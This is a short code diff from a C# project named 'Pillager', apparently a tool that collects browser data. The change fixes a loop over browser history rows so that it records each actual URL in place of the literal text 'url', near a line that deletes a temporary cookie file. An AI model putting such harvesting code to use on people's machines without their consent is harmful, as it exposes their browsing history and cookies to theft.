@@ -140,7 +140,7 @@ namespace Pillager.Browsers
                 for (int i = 0; i < handler.GetRowCount(); i++)
                 {
                     string url = handler.GetValue(i, "url");
-                    history.AppendLine("url");
+                    history.AppendLine(url);
                 }
                 File.Delete(cookie_tempFile);
             }
